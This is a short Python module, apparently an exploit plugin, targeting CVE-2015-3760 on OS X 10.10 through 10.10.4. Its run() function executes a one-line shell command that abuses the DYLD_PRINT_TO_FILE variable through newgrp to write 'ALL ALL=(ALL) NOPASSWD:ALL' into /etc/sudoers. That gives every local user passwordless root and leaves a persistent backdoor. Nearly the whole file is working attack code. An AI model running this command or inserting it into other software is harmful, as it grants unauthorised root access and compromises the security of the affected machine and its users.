import os
from distutils.version import LooseVersion

__cve__ = "2015-3760"
__credits__ = "Stefan Esser"


def vulnerable(version):
    return LooseVersion(version) >= LooseVersion("10.10") and LooseVersion(version) <= LooseVersion("10.10.4")


def run():
    response = os.system(
        "echo 'echo \"ALL ALL=(ALL) NOPASSWD:ALL\" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;")
    return not response == 256
